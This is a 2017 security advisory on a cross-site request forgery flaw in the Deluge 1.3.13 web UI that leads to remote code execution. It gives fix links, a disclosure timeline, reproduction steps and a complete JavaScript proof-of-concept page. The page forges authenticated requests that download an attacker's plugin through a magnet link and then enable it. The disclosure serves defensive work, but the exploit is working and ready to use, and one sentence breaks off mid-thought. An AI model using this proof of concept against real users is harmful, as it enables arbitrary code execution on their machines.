Remote code execution via CSRF vulnerability in the web UI of Deluge 1.3.13
 
Kyle Neideck, February 2017
 
 
Product
-------
 
Deluge is a BitTorrent client available from http://deluge-torrent.org.
 
Fix
---
 
Fixed in the (public) source code, but not in binary releases yet. See
http://git.deluge-torrent.org/deluge/commit/?h=develop&id=11e8957deaf0c76fdfbac62d99c8b6c61cfdddf9
and
http://git.deluge-torrent.org/deluge/commit/?h=1.3-stable&id=318ab179865e0707d7945edc3a13a464a108d583
 
Install from source or use the web UI from an incognito/private window until
new binaries are released.
 
Summary
-------
 
Deluge version 1.3.13 is vulnerable to cross-site request forgery in the Web UI
plug-in resulting in remote code execution. Requests made to the /json endpoint
are not checked for CSRF. See the "render" function of the "JSON" class in
deluge/ui/web/json_api.py.
 
The Web UI plug-in is installed, but not enabled, by default. If the user has
enabled the Web UI plug-in and logged into it, a malicious web page can use
forged requests to make Deluge download and install a Deluge plug-in provided
by the attacker. The plug-in can then execute arbitrary code as the user
running Deluge (usually the local user account).
 
Timeline
--------
 
2017-03-01 Disclosed the vulnerability to Calum Lind (Cas) of Deluge Team
2017-03-01 Vulnerability fixed by Calum Lind
2017-03-05 Advisory released
 
To Reproduce
------------
 
 - Create/find a Deluge plug-in to be installed on the victim machine. For
   example, create an empty plug-in with
       python deluge/scripts/create_plugin.py --name malicious --basepath . \
           --author-name "n" --author-email "e"
   (see
   http://git.deluge-torrent.org/deluge/tree/deluge/scripts/create_plugin.py?h=1.3-stable&id=318ab179865e0707d7945edc3a13a464a108d583)
   and add a line to its __init__.py to launch calc.exe.
 - Build the plug-in as a .egg (if necessary):
       python malicious/setup.py bdist_egg
 - Make a torrent containing the .egg and seed it somewhere.
 - Create a Magnet link for the torrent.
 - In the proof-of-concept page below, update the PLUGIN_NAME, PLUGIN_FILE and
   MAGNET_LINK constants.
 - Put the PoC on a web server somewhere. Serving it locally is fine.
 - In Deluge, open Preferences, go to the Plugins category and enable the Web
   UI plug-in.
   port should be set to 8112 by default.
 - If you&#039;re serving the PoC over HTTPS, check "Enable SSL" so its requests
   don&#039;t get blocked as mixed content. If you&#039;re not, SSL can be enabled or
   disabled.
 - Go to localhost:8112 in a browser on the victim machine and log in.
 - Open the PoC in the same browser.
 
The PoC sends requests to localhost:8112 that include cookies. The first
request adds the torrent, which downloads the .egg (the plug-in) to /tmp. It
then sends repeated requests to install the .egg and enable it. The attacker&#039;s
code in the plug-in runs when the plug-in is enabled.
 
For the attack to be successful, the PoC page must be left open until the
malicious plug-in finishes downloading. An attacker could avoid that limitation
by using the Execute plug-in, which is installed by default, but Deluge has to
be restarted before the Execute plug-in can be used. I don&#039;t think that can be
done from the web UI, so the attacker&#039;s code would only execute after the
victim restarted Deluge and then added/removed/completed a torrent.
 
The PoC adds the plug-in torrent using a Magnet link because it would need to
 
Proof of Concept
----------------
-->
 
<!--
Deluge 1.3.13 Web UI CSRF
 
Tested on Linux, macOS and Windows.
 
Kyle Neideck, February 2017
kyle@bearisdriving.com
-->
<html><body><script>
let PLUGIN_NAME = &#039;malicious&#039;;
let PLUGIN_FILE = &#039;malicious-0.1-py2.7.egg&#039;;
let MAGNET_LINK =
    &#039;magnet:?xt=urn:btih:1b02570de69c0cb6d12c544126a32c67c79024b4&#039; +
        &#039;&dn=malicious-0.1-py2.7.egg&#039; +
        &#039;&tr=http%3A%2F%2Ftracker.example.com%3A6969%2Fannounce&#039;;
 
function send_deluge_json(json) {
    console.log(&#039;Sending: &#039; + json);
 
    for (let proto of [&#039;http&#039;,&#039;https&#039;]) {
        let xhr = new XMLHttpRequest();
 
        xhr.open(&#039;POST&#039;, proto + &#039;://localhost:8112/json&#039;);
        xhr.setRequestHeader(&#039;Content-Type&#039;, &#039;text/plain&#039;);
        xhr.withCredentials = true;
        xhr.onload = function() { console.log(xhr); };
        xhr.send(json);
    }
}
 
let download_location =
    (navigator.appVersion.indexOf("Win") != -1) ?
        &#039;C:\\\\Users\\\\Public&#039; : &#039;/tmp&#039;;
 
// Download a malicious plugin using a Magnet link.
//
// Using the /upload endpoint or adding a .torrent file wouldn&#039;t work. We could
// upload the file (either a .torrent or the plug-in itself), but it would be
// the path to the file from the response, and to finish the process we&#039;d need
// to send a second request that includes that path.
send_deluge_json(&#039;{&#039; +
    &#039;"method":"web.add_torrents",&#039; +
    &#039;"params":[[{&#039; +
        &#039;"path":"&#039; + MAGNET_LINK + &#039;",&#039; +
        &#039;"options":{&#039; +
            &#039;"file_priorities":[],&#039; +
            &#039;"add_paused":false,&#039; +
            &#039;"compact_allocation":false,&#039; +
            &#039;"download_location":"&#039; + download_location + &#039;",&#039; +
            &#039;"move_completed":false,&#039; +
            &#039;"move_completed_path":"&#039; + download_location + &#039;",&#039; +
            &#039;"max_connections":-1,&#039; +
            &#039;"max_download_speed":-1,&#039; +
            &#039;"max_upload_slots":-1,&#039; +
            &#039;"max_upload_speed":-1,&#039; +
            &#039;"prioritize_first_last_pieces":false}}]],&#039; +
        &#039;"id":12345}&#039;);
 
window.stop = false;
 
// Repeatedly try to enable the plugin, since we can&#039;t tell when it will finish
// downloading.
function try_to_add_and_enable_plugin() {
    send_deluge_json(&#039;{&#039; +
        &#039;"method":"web.upload_plugin",&#039; +
        &#039;"params":["&#039; + PLUGIN_FILE + &#039;","&#039; +
            download_location + &#039;/&#039; + PLUGIN_FILE + &#039;"],&#039; +
        &#039;"id":12345}&#039;);
 
    send_deluge_json(&#039;{&#039; +
        &#039;"method":"core.enable_plugin",&#039; +
        &#039;"params":["&#039; + PLUGIN_NAME + &#039;"],&#039; +
        &#039;"id":12345}&#039;);
 
    if (!window.stop) {
        window.setTimeout(try_to_add_and_enable_plugin, 500);
    }
}
 
try_to_add_and_enable_plugin();
</script>
<button onclick="window.stop = true">Stop sending requests</button>
</body></html>

